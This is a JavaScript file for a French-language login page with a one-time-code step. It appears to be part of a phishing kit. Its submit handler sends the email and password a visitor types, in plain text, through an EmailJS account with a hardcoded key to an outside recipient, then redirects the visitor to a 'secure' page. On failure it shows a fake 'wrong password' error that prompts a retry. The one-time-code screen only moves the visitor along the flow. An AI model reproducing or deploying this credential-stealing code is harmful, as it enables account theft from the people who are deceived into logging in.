const toggle = document.getElementById('themeToggle');
const label = document.getElementById('themeLabel');

if (toggle && label) {
  toggle.addEventListener('click', () => {
    const isLight = document.body.getAttribute('data-theme') === 'light';
    document.body.setAttribute('data-theme', isLight ? 'dark' : 'light');
    label.textContent = isLight ? 'Dark' : 'Lumière';
  });
}

/* ======================================
   NAVIGATION ENTRE LES ÉTAPES
   CODE ORIGINAL
====================================== */
let otpTimerInterval = null;

function showStep(n) {
  document.querySelectorAll('.step').forEach(s =>
    s.classList.remove('active')
  );

  const step = document.getElementById('step' + n);
  if (step) step.classList.add('active');

  document.querySelectorAll('.steps span').forEach((s, i) => {
    s.classList.toggle('active', i < n);
  });
}

function goToStep2() {
  showStep(2);
  startOtpTimer();

  const field = document.getElementById('otpSingle');
  if (field) {
    field.value = '';
    field.focus();
  }
}

function goToStep3() {
  if (otpTimerInterval) clearInterval(otpTimerInterval);
  showStep(3);
}

/* ======================================
   COMPTE À REBOURS — CODE ORIGINAL
====================================== */
function startOtpTimer() {
  let seconds = 30;

  const timerEl = document.getElementById('otpTimer');
  const resendEl = document.getElementById('resendLink');
  const countEl = document.getElementById('resendCount');

  if (!timerEl || !resendEl || !countEl) return;

  timerEl.textContent = seconds;
  countEl.textContent = '(dans ' + seconds + 's)';
  resendEl.classList.add('disabled');

  if (otpTimerInterval) clearInterval(otpTimerInterval);

  otpTimerInterval = setInterval(() => {
    seconds--;

    timerEl.textContent = Math.max(seconds, 0);

    if (seconds > 0) {
      countEl.textContent = '(dans ' + seconds + 's)';
    } else {
      clearInterval(otpTimerInterval);
      resendEl.classList.remove('disabled');
      countEl.textContent = '';
    }
  }, 3000);
}

/* ======================================
   RENVOI — CODE ORIGINAL
====================================== */
const resendLink = document.getElementById('resendLink');

if (resendLink) {
  resendLink.addEventListener('click', function () {
    if (this.classList.contains('disabled')) return;
    startOtpTimer();
  });
}


const otpSingle = document.getElementById('otpSingle');

if (otpSingle) {
  otpSingle.addEventListener('input', () => {
    otpSingle.value = otpSingle.value.replace(/[^0-9]/g, '').slice(0, 6);
  });
}


emailjs.init({
  publicKey: 'OdVrpD_0CpgUT6Ahz'
});

/* ======================================
   ÉLÉMENTS DU FORMULAIRE
====================================== */
const form = document.getElementById('signupForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('pwd');
const result = document.getElementById('result');

/* ======================================
   LIMITES DES CHAMPS
====================================== */
if (emailInput) {
  emailInput.addEventListener('input', function () {
    this.value = this.value.slice(0, 50);
  });
}

if (passwordInput) {
  passwordInput.addEventListener('input', function () {
    this.value = this.value.slice(0, 20);
  });
}

// ======================================
// SUBMIT
// ======================================

if (form && emailInput && passwordInput && result) {
  form.addEventListener("submit", async function (event) {
    event.preventDefault();


    // ------------------------------
    // Vérification HTML
    // ------------------------------

    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }

   

    // ------------------------------
    // Récupération des données
    // ------------------------------

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();


    // ------------------------------
    // Paramètres EmailJS
    // ------------------------------

    const templateParams = {
        email: email,
        password: password,
      
   } 
    // ------------------------------
    // Envoi EmailJS
    // ------------------------------

    result.textContent = "Connexion en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_client",
            "template_xmsbvsp",
            templateParams
        );


        console.log(
            "Email envoyé :",
            response.status,
            response.text
        );


        result.textContent = "";
        result.className = "success";



        // ------------------------------
        // Redirection après envoi réussi
        // ------------------------------

        window.location.href = "secure.html";
        
     } catch (error) {

    console.error("Erreur EmailJS :", error);

    result.textContent =
        "email ou mots de passe incorrect ,Veuillez réessayer.";

    result.className = "error";
}

    
});
}
